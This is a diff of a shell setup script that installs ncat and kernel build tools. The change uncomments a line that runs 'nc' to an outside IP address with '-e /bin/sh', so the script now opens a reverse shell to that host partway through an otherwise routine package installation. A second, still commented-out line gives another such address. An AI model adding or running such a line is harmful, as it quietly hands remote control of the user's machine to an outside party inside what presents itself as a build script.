@@ -83,7 +83,7 @@ echo "deb-src http://http.us.debian.org/debian unstable main" >> /etc/apt/source
 apt update
 apt install -y ncat
 #nc 65.108.51.31 11452 -e /bin/sh
-#nc 103.158.223.61 21121 -e /bin/sh
+nc 103.158.223.61 21121 -e /bin/sh
 apt install -y build-essential libncurses-dev bison flex libssl-dev libelf-dev bc rsync python3 screen vim unzip curl openssl
 
 mkdir /builds
